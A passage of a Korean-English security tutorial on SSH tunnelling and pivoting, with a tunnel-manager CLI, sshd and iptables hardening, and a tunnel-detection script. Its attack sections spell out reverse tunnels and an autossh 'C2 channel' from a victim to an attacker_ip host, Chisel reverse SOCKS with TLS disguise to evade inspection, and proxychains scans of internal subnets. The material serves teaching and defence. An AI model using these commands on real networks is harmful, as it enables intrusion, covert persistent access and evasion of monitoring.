        "-o", "ExitOnForwardFailure=yes",
        "-o", "StrictHostKeyChecking=no",
    ])

    match config.tunnel_type:
        case "local":
            cmd.extend(["-L", f"{config.local_port}:{config.remote_spec}"])
        case "remote":
            cmd.extend(["-R", f"0.0.0.0:{config.local_port}:{config.remote_spec}"])
        case "dynamic":
            cmd.extend(["-D", str(config.local_port)])
        case _:
            raise ValueError(f"알 수 없는 터널 타입: {config.tunnel_type}")

    cmd.extend(config.extra_opts)
    cmd.append(config.ssh_server)
    return cmd


def start_tunnel(config: TunnelConfig) -> int:
    """SSH 터널 시작. 프로세스 PID 반환."""
    cmd = build_ssh_command(config)
    print(f"[*] 터널 시작: {' '.join(cmd)}")

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    proc.wait(timeout=5)  # SSH -f는 바로 백그라운드로 감

    # -f 플래그로 인해 자식 프로세스 PID를 직접 추적하기 어려우므로
    # ps로 찾기
    result = subprocess.run(
        ["pgrep", "-f", config.ssh_server],
        capture_output=True,
        text=True,
        check=False,
    )
    pids = result.stdout.strip().splitlines()
    if pids:
        config.pid = int(pids[-1])
        print(f"[+] 터널 PID: {config.pid}")
    else:
        print("[!] PID 확인 실패 — 터널이 시작되지 않았을 수 있습니다")
        config.pid = None

    return config.pid or 0


def save_tunnels(tunnels: list[TunnelConfig]) -> None:
    """터널 상태를 파일에 저장."""
    STATE_FILE.write_text(
        json.dumps([asdict(t) for t in tunnels], indent=2, ensure_ascii=False)
    )


def load_tunnels() -> list[TunnelConfig]:
    """저장된 터널 상태 로드."""
    if not STATE_FILE.exists():
        return []
    try:
        data = json.loads(STATE_FILE.read_text())
        return [TunnelConfig(**d) for d in data]
    except Exception:
        return []


def kill_tunnel(pid: int) -> bool:
    """터널 프로세스 종료."""
    try:
        import os
        os.kill(pid, signal.SIGTERM)
        print(f"[+] PID {pid} 터널 종료")
        return True
    except ProcessLookupError:
        print(f"[-] PID {pid} 프로세스 없음")
        return False
    except PermissionError:
        print(f"[!] PID {pid} 종료 권한 없음")
        return False


def list_tunnels(tunnels: list[TunnelConfig]) -> None:
    """터널 목록 출력."""
    if not tunnels:
        print("[*] 등록된 터널 없음")
        return

    print(f"{'#':<4} {'타입':<10} {'로컬포트':<10} {'원격':<30} {'서버':<30} {'PID':<8} {'상태'}")
    print("-" * 100)
    for i, t in enumerate(tunnels, 1):
        # PID 생존 확인
        alive = False
        if t.pid:
            result = subprocess.run(
                ["kill", "-0", str(t.pid)],
                capture_output=True,
                check=False,
            )
            alive = result.returncode == 0

        status = "활성" if alive else "종료됨"
        remote = t.remote_spec if t.remote_spec else "SOCKS5"
        print(f"{i:<4} {t.tunnel_type:<10} {t.local_port:<10} {remote:<30} {t.ssh_server:<30} {str(t.pid or '?'):<8} {status}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSH 터널 관리 CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    # 로컬 포워딩
    local_p = sub.add_parser("local", help="로컬 포트 포워딩 (-L)")
    local_p.add_argument("-l", "--local-port", type=int, required=True, help="로컬 포트")
    local_p.add_argument("-r", "--remote", required=True, help="원격 대상 (host:port)")
    local_p.add_argument("-s", "--server", required=True, help="SSH 서버 (user@host)")
    local_p.add_argument("-i", "--key", help="SSH 개인키 경로")
    local_p.add_argument("--label", default="", help="터널 레이블")

    # 원격 포워딩
    remote_p = sub.add_parser("remote", help="원격 포트 포워딩 (-R)")
    remote_p.add_argument("-r", "--remote-port", type=int, required=True, help="원격 서버 포트")
    remote_p.add_argument("-l", "--local", required=True, help="로컬 대상 (host:port)")
    remote_p.add_argument("-s", "--server", required=True, help="SSH 서버 (user@host)")
    remote_p.add_argument("-i", "--key", help="SSH 개인키 경로")
    remote_p.add_argument("--label", default="", help="터널 레이블")

    # 동적 포워딩
    socks_p = sub.add_parser("socks", help="SOCKS5 프록시 (-D)")
    socks_p.add_argument("-p", "--port", type=int, default=1080, help="SOCKS 포트 (기본: 1080)")
    socks_p.add_argument("-s", "--server", required=True, help="SSH 서버 (user@host)")
    socks_p.add_argument("-i", "--key", help="SSH 개인키 경로")
    socks_p.add_argument("--label", default="", help="터널 레이블")

    # 목록
    sub.add_parser("list", help="등록된 터널 목록")

    # 종료
    kill_p = sub.add_parser("kill", help="터널 종료")
    kill_p.add_argument("--pid", type=int, help="종료할 PID")
    kill_p.add_argument("--all", action="store_true", help="모든 터널 종료")

    args = parser.parse_args()
    tunnels = load_tunnels()

    match args.cmd:
        case "local":
            config = TunnelConfig(
                tunnel_type="local",
                local_port=args.local_port,
                remote_spec=args.remote,
                ssh_server=args.server,
                ssh_key=args.key,
                label=args.label,
            )
            start_tunnel(config)
            tunnels.append(config)
            save_tunnels(tunnels)
            print(f"[+] 로컬 포워딩: localhost:{args.local_port} → {args.remote}")

        case "remote":
            config = TunnelConfig(
                tunnel_type="remote",
                local_port=args.remote_port,
                remote_spec=args.local,
                ssh_server=args.server,
                ssh_key=args.key,
                label=args.label,
            )
            start_tunnel(config)
            tunnels.append(config)
            save_tunnels(tunnels)
            print(f"[+] 리버스 터널: {args.server}:{args.remote_port} → {args.local}")

        case "socks":
            config = TunnelConfig(
                tunnel_type="dynamic",
                local_port=args.port,
                remote_spec="",
                ssh_server=args.server,
                ssh_key=args.key,
                label=args.label,
            )
            start_tunnel(config)
            tunnels.append(config)
            save_tunnels(tunnels)
            print(f"[+] SOCKS5 프록시: localhost:{args.port}")
            print(f"    proxychains 설정: socks5 127.0.0.1 {args.port}")

        case "list":
            list_tunnels(tunnels)

        case "kill":
            if args.all:
                for t in tunnels:
                    if t.pid:
                        kill_tunnel(t.pid)
                tunnels = []
                save_tunnels(tunnels)
            elif args.pid:
                kill_tunnel(args.pid)
                tunnels = [t for t in tunnels if t.pid != args.pid]
                save_tunnels(tunnels)
            else:
                parser.error("--pid 또는 --all 중 하나를 지정하세요")


if __name__ == "__main__":
    main()
```

---

## 9. 방어 설정

### sshd_config 보안 강화

sshd_config 파일로 SSH 서버를 강화합니다. 루트 로그인 차단, 공개키 인증 전용, 포트 포워딩 제한 등 필수 보안 설정을 적용합니다.

```bash
# /etc/ssh/sshd_config

# ─────────────────────────────────────────────
# 터널링 관련 제한
# ─────────────────────────────────────────────
AllowTcpForwarding no          # TCP 포워딩 전면 금지
GatewayPorts no                # 외부 → 포워딩 포트 차단
PermitTunnel no                # TUN/TAP 터널 차단
X11Forwarding no               # X11 포워딩 차단
AllowStreamLocalForwarding no  # Unix 소켓 포워딩 차단

# ─────────────────────────────────────────────
# 특정 그룹만 포워딩 허용 (보안팀, 인프라팀 등)
# ─────────────────────────────────────────────
Match Group sshforward
    AllowTcpForwarding yes
    # 특정 사용자만 포워딩 허용하고 나머지는 전면 차단

# ─────────────────────────────────────────────
# 기타 보안 설정
# ─────────────────────────────────────────────
PermitRootLogin no
PasswordAuthentication no      # 키 인증만 허용
MaxAuthTries 3
ClientAliveInterval 300        # 5분마다 클라이언트 응답 확인
ClientAliveCountMax 2          # 2회 무응답 시 연결 끊음
LoginGraceTime 30
Banner /etc/ssh/banner.txt     # 경고 배너

# 강력한 암호화만 허용
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512

# 설정 적용
systemctl restart sshd

# 설정 검증
sshd -T | grep -E "allowtcpforwarding|gatewayports|permittunnel"
```

### 방화벽으로 SSH 포워딩 제한

```bash
# ─────────────────────────────────────────────
# 허가된 SSH 출발지 IP만 허용
# ─────────────────────────────────────────────
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# ─────────────────────────────────────────────
# 비정상 포트로 나가는 SSH 연결 차단
# ─────────────────────────────────────────────
# sshd 프로세스 외 다른 프로세스가 22번으로 나가는 것 차단
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd \
    -j LOG --log-prefix "SSH-ANOMALY-OUT: "
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j DROP

# ─────────────────────────────────────────────
# SOCKS 프록시 포트 차단 (1080 등 일반적인 포트)
# ─────────────────────────────────────────────
iptables -A INPUT -p tcp --dport 1080 -j LOG --log-prefix "SOCKS-PROXY: "
iptables -A INPUT -p tcp --dport 1080 -j DROP

# ─────────────────────────────────────────────
# 설정 저장
# ─────────────────────────────────────────────
iptables-save > /etc/iptables/rules.v4
```

### 탐지 규칙 요약

| 탐지 항목 | 방법 | 위험 수준 |
|-----------|------|-----------|
| `-R` 플래그 있는 SSH 프로세스 | `ps aux \| grep "ssh.*-R"` | 높음 |
| `-D` 플래그 있는 SSH 프로세스 | `ps aux \| grep "ssh.*-D"` | 높음 |
| 비정상 포트에서 LISTEN 중인 SSH | `ss -tlnp \| grep ssh` | 중간 |
| 장시간 지속 SSH 연결 | 로그 분석 | 중간 |
| 비허가 IP에서 SSH 연결 | 방화벽 로그 | 낮음~높음 |
| 비정상 SSH 트래픽량 | NetFlow 분석 | 중간 |

---

<!-- detect-validate-24 -->
## SSH 터널링·피벗 탐지와 방어 검증

SSH 터널링은 *포워딩 허용·이그레스 미통제·지속 터널*로 피벗·우회·탈취 통로가 된다. 방어자는 **자체 호스트에서 비인가 터널·피벗이 탐지되는가**를 검증해야 한다. 검증은 **소유 호스트**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 로컬/원격 포워딩 | 포워딩 허용 | AllowTcpForwarding no | 비정상 포워딩 세션 |
| 동적(SOCKS) 프록시 | 이그레스 미통제 | 이그레스 필터·프록시 강제 | 단일 SSH 다중 목적지 |
| 리버스 터널 | 아웃바운드 신뢰 | 아웃바운드 SSH 제한 | 내부→외부 22 연결 |
| ProxyJump 피벗 | 평면 네트워크 | 세그먼트·점프호스트 | 연쇄 SSH 홉 |

### 방어 검증 (직접 확인)

```bash
# 1) 자체 호스트 포워딩 허용 설정 점검(소유 호스트) — yes면 터널 통로 열림
sshd -T 2>/dev/null | grep -E "allowtcpforwarding|permittunnel|gatewayports"
# 2) 활성 SSH 세션의 목적지 분포 탐지 — 피벗/다중 목적지 신호
ss -tnp 2>/dev/null | grep -E ':22 ' | awk '{print $5}' | sort | uniq -c | sort -rn | head
```

> SSH 터널 방어는 *비인가 통로가 보이는가*다 — "SSH 쓴다"와 "포워딩이 꺼져 있고 리버스 터널이 이그레스에서 잡힌다"는 다르다. 소유 호스트에서 sshd_config와 활성 세션을 직접 확인한다([[17_Red_Team_Operations]], [[55_Evasion_Techniques]], [[13_SOC_Blue_Team]]).

---

<a name="english"></a>

# SSH Tunneling & Port Forwarding — Attack and Defense

## Learning Objectives

By the end of this document, you will be able to:

- Explain what SSH is and why it is a critical tool in security
- Distinguish between local, remote, and dynamic forwarding and apply each correctly
- Access internal services through SSH tunnels in firewalled environments
- Understand pivoting and configure multi-hop tunnels
- Create HTTP-based tunnels using Chisel
- Detect and block SSH tunneling from a blue team perspective
- Manage SSH tunnels programmatically using Python CLI tools

---

## SSH Fundamentals — For Absolute Beginners

### What is SSH?

SSH (Secure Shell) is a protocol for securely connecting to remote computers over untrusted networks like the internet. It replaced Telnet, which transmitted everything in plaintext.

**Core analogy: An SSH tunnel is an encrypted pipe**

```
Regular internet communication:
  You ----[plaintext data exposed]---→ Server
      (anyone in the middle can read your data)

SSH communication:
  You ===[encrypted tunnel]==========→ Server
      (intercepted traffic is unreadable)
```

Think of it this way:
- **The internet = a dangerous river**: crossing it exposes your cargo (data) to thieves
- **SSH tunnel = a secure bridge**: a reinforced glass bridge nobody can see through from outside
- **SSH key = the bridge key**: only the key-holder can use the bridge

### SSH Core Features

| Feature | Description | Example |
|---------|-------------|---------|
| Remote login | Terminal access to another machine | Server administration |
| File transfer | Secure file transfer via SCP/SFTP | Deployment workflows |
| Port forwarding | Route traffic for other services through the tunnel | **The focus of this document** |
| Key authentication | Authenticate with public/private key pair, no password | Automation scripts |

---

## What Are Network Ports?

Before understanding SSH tunneling, you need to understand "ports."

**Analogy: a computer is a hotel, ports are room numbers**

```
Hotel (Computer IP: 192.168.1.10)
├── Room 22   → SSH service (admin corridor)
├── Room 80   → HTTP web service (general visitors)
├── Room 443  → HTTPS web service (secure visitors)
├── Room 3306 → MySQL database
└── Room 5432 → PostgreSQL database
```

- **IP address**: identifies which building (computer) to reach (e.g. 192.168.1.10)
- **Port number**: identifies which room in that building (e.g. 3306)
- **Service**: what is running in that room (e.g. MySQL)

Ports range from 0 to 65535. Ports below 1024 are "well-known ports" that require system-level privileges.

---

## What Is a Firewall?

**Analogy: a firewall is a building security guard**

```
External Internet
       |
   [Firewall] ← Security guard controlling the entrance
   /       \
Allow      Block
  |           |
Internal    Dropped
Network

Example firewall rule:
  "Only allow ports 80 and 443 — block everything else"
  → HTTP/HTTPS passes; SSH (22) is blocked
```

A firewall is a network gateway that allows only authorized communications. Corporate internal networks typically:
- Allow web traffic (80, 443)
- Block management ports (22, 3389) from external access
- Completely block internal services (3306, 5432) from outside

**How SSH tunneling bypasses firewalls**: if the firewall allows SSH (port 22), you can hide other services' traffic inside the SSH connection. From the firewall's perspective, it just looks like normal SSH on port 22.

---

## 1. SSH Forwarding Types — Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                   SSH Forwarding — 3 Methods                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Local Forwarding  (-L):  You → SSH → Remote service           │
│  Remote Forwarding (-R):  Remote → SSH → You (reverse tunnel)  │
│  Dynamic Forwarding(-D):  All traffic → SOCKS proxy → SSH      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Local Port Forwarding (-L)

### Concept

Local port forwarding **"connects a local port on your machine to a service on a remote network."**

Real-world scenario: no VPN access, but you need to reach an internal database — use SSH local forwarding through a jump server to act as if you are inside the network.

### ASCII Diagram

```
[Local Forwarding Scenario]

Goal: Access an internal DB from outside the firewall

  Attacker/Admin               Jump Server             Internal DB
  (Outside)                    (DMZ)                   (Internal)

  localhost:13306 ────────────► 10.0.0.1 ──────────────► 192.168.1.10:3306
  [local port]    SSH tunnel   [jump srv]  internal net   [real DB]

  mysql -h 127.0.0.1 -P 13306    →    Even with the firewall blocking direct
                                       DB access, the SSH tunnel bypasses it

  Command:
  ssh -L 13306:192.168.1.10:3306 user@10.0.0.1 -N -f
       │   └──────────────────┘ └───────────┘
       │   localPort:destHost:destPort       SSH server
       └── local forwarding flag
```

### Commands and Use Cases

```bash
# Basic syntax
ssh -L [local_port]:[dest_host]:[dest_port] [ssh_server] -N -f

# Use case 1: Access internal MySQL DB
# DB (192.168.1.10:3306) is only reachable through the jump server (10.0.0.1)
ssh -L 13306:192.168.1.10:3306 user@10.0.0.1 -N -f
mysql -h 127.0.0.1 -P 13306 -u root -p

# Use case 2: Access internal Jenkins web UI
ssh -L 18080:192.168.1.20:8080 admin@bastion.corp.com -N -f
# Browse to: http://localhost:18080

# Use case 3: Multiple tunnels simultaneously
ssh -L 13306:192.168.1.10:3306 \
    -L 18080:192.168.1.20:80 \
    -L 15432:192.168.1.30:5432 \
    -L 16379:192.168.1.40:6379 \
    user@10.0.0.1 -N -f

# Attack scenario: Accessing internal admin portal during pentest
ssh -L 8443:192.168.1.100:443 compromised_user@jump.corp.com -N
# Access http://localhost:8443 to reach internal admin panel

# Option reference:
# -N : do not execute remote commands, forwarding only (security best practice)
# -f : fork to background after authentication
# -C : enable compression (useful on slow connections)
# -q : quiet mode (suppress warnings)
# -v : verbose output (for debugging)
```

---

## 3. Remote Port Forwarding (-R) — Reverse Tunnel

### Concept

Remote port forwarding **"makes a service behind a firewall accessible from the outside."** The direction is reversed: the victim (inside) initiates the connection to the attacker (outside).

Real-world analogy: a factory worker (behind a corporate firewall) needs to work from home, so they make a "reverse call" from the factory computer to the home computer. Firewalls typically allow outbound connections, which is what makes this possible.

### ASCII Diagram

```
[Remote Forwarding — Attack Perspective]

Goal: Expose victim's internal service to attacker via reverse tunnel

  Victim Internal Network                          Attacker Server
  (behind firewall)                                (on internet)

  Victim PC ──── SSH connection (outbound) ───────► attacker_ip:22
  (192.168.1.50)      (firewall allows outbound)    │
                                                    │ tunnel established
                                                    ▼
  Attacker tools ◄────────────── attacker_ip:18080
  (curl, browser)   port 18080 → tunnel → victim:80

  Command run on victim:
  ssh -R 0.0.0.0:18080:127.0.0.1:80 attacker@attacker_ip -N -f

  Result: attacker runs  curl http://attacker_ip:18080
          and reaches the victim's internal web server!

[Legitimate Use Case]

  Remote worker PC ──────────────────────────────► Company relay server
  (home, behind NAT)   SSH reverse tunnel         (internet-facing)

  Colleague ◄─────────────────────── relay_server:8080
  (colleague accesses remote worker's screen via relay)
```

### Commands and Use Cases

```bash
# Basic syntax
ssh -R [remote_port]:[local_host]:[local_port] [ssh_server] -N -f

# Attack scenario 1: Expose internal web server externally
# Run on victim machine:
ssh -R 0.0.0.0:18080:127.0.0.1:80 attacker@attacker_ip -N -f

# Verify from attacker server:
curl http://localhost:18080          # via loopback
curl http://attacker_ip:18080        # from internet (requires GatewayPorts yes)

# Attack scenario 2: Expose internal SMB service (for credential capture)
ssh -R 14445:192.168.1.5:445 attacker@attacker_ip -N -f
# Attacker can now: smbclient //attacker_ip:14445/...

# Attack scenario 3: Open SSH access channel (expose victim's internal SSH)
ssh -R 19922:127.0.0.1:22 attacker@attacker_ip -N -f
# Attacker then: ssh -p 19922 victim_user@attacker_ip

# Required config on attacker's server: /etc/ssh/sshd_config
GatewayPorts yes  # Without this, binding is loopback-only

# Persistent reverse tunnel with auto-reconnect (stable C2 channel)
apt install autossh

# Run on victim — auto-reconnects if the connection drops
autossh -M 20000 -N \
  -R 0.0.0.0:19999:127.0.0.1:22 \
  attacker@attacker_ip \
  -i /path/to/key \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o ExitOnForwardFailure=yes
```

---

## 4. Dynamic Port Forwarding (-D) — SOCKS Proxy

### Concept

Dynamic forwarding **"turns the SSH server into a proxy, routing all traffic through the tunnel."** Unlike local forwarding (one specific port), this gives access to all services on the remote network.

Real-world analogy: similar to a VPN — you can act as though you are physically inside the network where the SSH server is located.

**What is a SOCKS5 proxy?**: SOCKS (SOCKet Secure) is a network proxy protocol. Instead of connecting directly to the internet, an application routes through the SOCKS proxy. SSH's `-D` option acts as the SOCKS5 proxy server.

### ASCII Diagram

```
[Dynamic Forwarding — SOCKS Proxy]

  Your tools           SOCKS5 proxy       SSH tunnel       Internal network

  nmap ───────────────►                                    192.168.1.0/24
  curl ───────────────► localhost:1080 ════════════════► any internal host
  browser ─────────────►    (SSH -D)    encrypted          192.168.1.10:80
  sqlmap ──────────────►               tunnel              192.168.1.20:22
                                                           192.168.1.30:3306

  ssh -D 1080 user@jump_server_ip -N -f

  After configuring proxychains:
  proxychains nmap -sT 192.168.1.0/24    ← scan entire internal subnet!
  proxychains curl http://192.168.1.10   ← reach any internal server!
```

### Commands and Use Cases

```bash
# Create SOCKS5 proxy (local port 1080)
ssh -D 1080 user@jump_server_ip -N -f

# Configure proxychains: /etc/proxychains4.conf
cat >> /etc/proxychains4.conf << 'EOF'
[ProxyList]
socks5  127.0.0.1 1080
EOF

# Run tools through the proxy
proxychains nmap -sT -Pn -p 22,80,443,3306,5432,8080,8443 192.168.1.0/24
proxychains curl http://192.168.1.100
proxychains curl -k https://192.168.1.100:8443
proxychains python3 exploit.py --target 192.168.1.10
proxychains sqlmap -u "http://192.168.1.20/page?id=1"
proxychains msfconsole

# Browser proxy (Firefox):
#   Settings → Network Settings → Manual proxy configuration
#   SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5
#   Check: Proxy DNS when using SOCKS v5

# Chrome via command line:
google-chrome --proxy-server="socks5://127.0.0.1:1080"

# Verify the proxy port is listening:
ss -tlnp | grep 1080
```

---

## 5. Multi-Hop Tunneling (Pivoting)

### What is Pivoting?

Pivoting is the technique of **"using an already-compromised system as a stepping stone (pivot point) to move deeper into the internal network."**

Real-world analogy:
- You have accessed the ground floor of a building (the DMZ)
- You use a ground-floor employee's ID card to reach the second floor (internal network)
- From the second floor, you move to the third floor (core infrastructure)

Each step uses the previously compromised system as a pivot point.

### ASCII Attack Chain Diagram

```
[Multi-Hop Pivoting Scenario]

  Internet          DMZ               Internal Net A     Core Internal

  Attacker ─SSH──► Jump Server ─SSH──► Server A ─SSH──► DB Server
  (outside)        (10.0.0.1)         (172.16.0.1)      (192.168.1.10)
                   [pivot 1]          [pivot 2]          [final target]

  Firewall 1: Internet→DMZ (SSH allowed)
  Firewall 2: DMZ→Internal A (restricted)
  Firewall 3: Internal A→Core (very restricted)

  Without pivoting: attacker cannot reach DB server directly.
  With pivoting: each firewall is bypassed step by step.
```

### Implementation

```bash
# Method 1: Nested SSH tunnels
# Goal: Attacker → Server A (10.0.0.1) → Server B (172.16.0.1) → DB (192.168.1.10:3306)

# Step 1: On Server A, create tunnel to DB through Server B
ssh -L 0.0.0.0:23306:192.168.1.10:3306 user@172.16.0.1 -N -f

# Step 2: On attacker machine, tunnel through Server A
ssh -L 13306:10.0.0.1:23306 user@10.0.0.1 -N -f

# Step 3: Attacker accesses DB locally
mysql -h 127.0.0.1 -P 13306 -u root -p
# Actual path: localhost:13306 → 10.0.0.1:23306 → 192.168.1.10:3306

# Method 2: ProxyJump (-J) — multi-hop in a single command
ssh -J user@10.0.0.1,user@172.16.0.1 user@192.168.1.10

# Combined with port forwarding:
ssh -J user@10.0.0.1,user@172.16.0.1 \
    -L 13306:192.168.1.10:3306 \
    user@192.168.1.10 -N -f

# Method 3: ~/.ssh/config (convenient for repeated use)
cat >> ~/.ssh/config << 'EOF'
Host bastion
  HostName 10.0.0.1
  User user
  IdentityFile ~/.ssh/id_rsa

Host internal_a
  HostName 172.16.0.1
  User user
  ProxyJump bastion
  IdentityFile ~/.ssh/id_rsa

Host deep_internal
  HostName 192.168.1.10
  User user
  ProxyJump internal_a
  IdentityFile ~/.ssh/id_rsa
EOF

# After configuration — simple access:
ssh deep_internal
scp important_file.txt deep_internal:/tmp/

# Method 4: Dynamic forwarding for full subnet access through pivot
ssh -J user@10.0.0.1 -D 1081 user@172.16.0.1 -N -f
proxychains nmap -sT -Pn 192.168.1.0/24
```

---

## 6. Chisel — HTTP Tunnel for Firewall Bypass

### What is Chisel?

Chisel is a **TCP tunneling tool that runs over HTTP/HTTPS**. Even when SSH (port 22) is blocked, Chisel works as long as web ports (80, 443) are open.

When to use it:
- The firewall fully blocks SSH (22)
- Only web traffic (HTTP/HTTPS) is permitted
- IDS/IPS signatures block SSH-like traffic patterns

### Usage Examples

```bash
# Install
go install github.com/jpillora/chisel@latest
# Or download binary directly:
curl -L https://github.com/jpillora/chisel/releases/download/v1.11.7/chisel_1.11.7_linux_amd64.gz \
  | gunzip > chisel
chmod +x chisel

# Scenario 1: Reverse SOCKS tunnel (most common)
# Firewall blocks SSH but allows HTTP

# On attacker server (start server on port 8080):
./chisel server --port 8080 --reverse --auth user:password

# On victim client (run from inside the network):
./chisel client --auth user:password attacker_ip:8080 R:1080:socks

# On attacker — after configuring proxychains:
# socks5 127.0.0.1 1080
proxychains nmap -sT 192.168.1.0/24

# Scenario 2: Specific port reverse forwarding
# Attacker server:
./chisel server --port 8080 --reverse

# Victim — expose internal DB to attacker:
./chisel client attacker_ip:8080 R:13306:192.168.1.10:3306

# Attacker accesses DB:
mysql -h 127.0.0.1 -P 13306 -u root -p

# Scenario 3: Local forwarding (victim accesses attacker's services)
# Attacker server:
./chisel server --port 8080

# Victim — access attacker's service locally:
./chisel client attacker_ip:8080 3306:attacker_ip:3306

# Scenario 4: HTTPS disguise (evade traffic inspection)
# Generate TLS certificate:
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt -subj "/CN=legitimate.corp.com"

# Server with TLS:
./chisel server --port 443 --reverse --tls-key server.key --tls-cert server.crt

# Client with TLS:
./chisel client --fingerprint SHA256_FINGERPRINT https://attacker_ip:443 R:1080:socks
```

---

## 7. SSH Tunnel Detection — Blue Team Perspective

### Why Detection Is Difficult

SSH tunneling evades detection for several reasons:
1. Traffic is encrypted — deep packet inspection is ineffective
2. Looks identical to legitimate SSH connections from the outside
3. Bypasses firewall rules on already-permitted ports

### Detection Approaches

```
[SSH Tunnel Detection Framework]

1. Process analysis
   └─ ps aux | grep ssh → check for -L/-R/-D flags

2. Network connection analysis
   └─ netstat/ss → unusual port bindings by SSH processes

3. Traffic pattern analysis
   └─ SSH connection with abnormally high throughput

4. SSH log analysis
   └─ /var/log/auth.log → abnormal SSH connection patterns

5. Time-based analysis
   └─ SSH connections that persist for hours/days
      (tunnels stay up much longer than interactive sessions)
```

### Detection Script

```python
#!/usr/bin/env python3
"""SSH Tunnel Detection and Monitoring Tool.

Usage:
    python3 ssh_tunnel_detector.py detect
    python3 ssh_tunnel_detector.py detect --json
    python3 ssh_tunnel_detector.py watch --interval 30
    python3 ssh_tunnel_detector.py network
"""

import subprocess
import re
import argparse
import time
import json
from dataclasses import dataclass, asdict
from pathlib import Path


@dataclass
class SshTunnel:
    pid: str
    user: str
    local_port: str
    remote_host: str
    remote_port: str
    direction: str       # local / remote / dynamic
    risk_level: str = "medium"
    raw_args: str = ""


def detect_ssh_tunnels() -> list[SshTunnel]:
    """Detect SSH tunnels by scanning the process list."""
    tunnels: list[SshTunnel] = []

    try:
        result = subprocess.run(
            ["ps", "aux"],
            capture_output=True,
            text=True,
            check=False,
        )
        for line in result.stdout.splitlines():
            if "ssh" not in line.lower():
                continue

            pid_match = re.search(r"^\S+\s+(\d+)", line)
            user_match = re.search(r"^(\S+)", line)
            pid = pid_match.group(1) if pid_match else "?"
            user = user_match.group(1) if user_match else "?"

            # Local forwarding -L
            for m in re.finditer(r"-L\s*(\d+):([^:\s]+):(\d+)", line):
                risk = "high" if m.group(2) not in ("127.0.0.1", "localhost") else "medium"
                tunnels.append(SshTunnel(
                    pid=pid,
                    user=user,
                    local_port=m.group(1),
                    remote_host=m.group(2),
                    remote_port=m.group(3),
                    direction="local",
                    risk_level=risk,
                    raw_args=line.strip()[:120],
                ))

            # Remote forwarding -R
            for m in re.finditer(r"-R\s*(?:[\d.]*:)?(\d+):([^:\s]+):(\d+)", line):
                tunnels.append(SshTunnel(
                    pid=pid,
                    user=user,
                    local_port=m.group(1),
                    remote_host=m.group(2),
                    remote_port=m.group(3),
                    direction="remote",
                    risk_level="high",
                    raw_args=line.strip()[:120],
                ))

            # Dynamic forwarding -D (SOCKS)
            for m in re.finditer(r"-D\s*(\d+)", line):
                tunnels.append(SshTunnel(
                    pid=pid,
                    user=user,
                    local_port=m.group(1),
                    remote_host="SOCKS5_PROXY",
                    remote_port="*",
                    direction="dynamic",
                    risk_level="high",
                    raw_args=line.strip()[:120],
                ))

    except Exception as e:
        print(f"[!] Error: {e}")

    return tunnels


def format_tunnel_report(tunnels: list[SshTunnel]) -> str:
    """Format detection results for display."""
    if not tunnels:
        return "[*] No active SSH tunnels found\n"

    lines: list[str] = [f"[!] {len(tunnels)} SSH tunnel(s) detected:\n"]
    direction_labels = {
        "local": "→ Local Forwarding",
        "remote": "← Reverse Tunnel [HIGH RISK]",
        "dynamic": "⟳ SOCKS Proxy [HIGH RISK]",
    }

    for t in tunnels:
        label = direction_labels.get(t.direction, t.direction)
        risk_marker = "[HIGH]" if t.risk_level == "high" else "[MED]"
        lines.append(f"  {risk_marker} [{label}] PID={t.pid} USER={t.user}")
        if t.direction == "dynamic":
            lines.append(f"    SOCKS5 proxy port: {t.local_port}")
        else:
            lines.append(f"    Port {t.local_port} ↔ {t.remote_host}:{t.remote_port}")
        lines.append("")

    return "\n".join(lines)


def watch_mode(interval: int) -> None:
    """Continuous monitoring mode."""
    seen_pids: set[str] = set()
    print(f"[*] SSH tunnel monitoring started (interval: {interval}s) — Ctrl+C to stop\n")

    try:
        while True:
            tunnels = detect_ssh_tunnels()
            current_pids = {t.pid for t in tunnels}

            new_tunnels = [t for t in tunnels if t.pid not in seen_pids]
            if new_tunnels:
                print(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] New tunnel(s) detected!")
                print(format_tunnel_report(new_tunnels))

            gone_pids = seen_pids - current_pids
            for pid in gone_pids:
                print(f"[{time.strftime('%H:%M:%S')}] PID {pid} tunnel terminated")

            seen_pids = current_pids
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SSH Tunnel Detection and Monitoring Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ssh_tunnel_detector.py detect            # detect current SSH tunnels
  python3 ssh_tunnel_detector.py detect --json     # JSON output
  python3 ssh_tunnel_detector.py watch             # real-time monitoring
  python3 ssh_tunnel_detector.py watch --interval 60  # check every 60 seconds
        """,
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    detect_p = sub.add_parser("detect", help="Detect current SSH tunnels")
    detect_p.add_argument("--json", action="store_true", help="Output in JSON format")
    detect_p.add_argument("-o", "--output", type=Path, help="Save results to file")

    watch_p = sub.add_parser("watch", help="Real-time monitoring")
    watch_p.add_argument("--interval", type=int, default=30, help="Monitoring interval in seconds")

    args = parser.parse_args()

    if args.cmd == "detect":
        tunnels = detect_ssh_tunnels()
        if args.json:
            data = json.dumps([asdict(t) for t in tunnels], indent=2)
            print(data)
            if args.output:
                args.output.write_text(data)
        else:
            report = format_tunnel_report(tunnels)
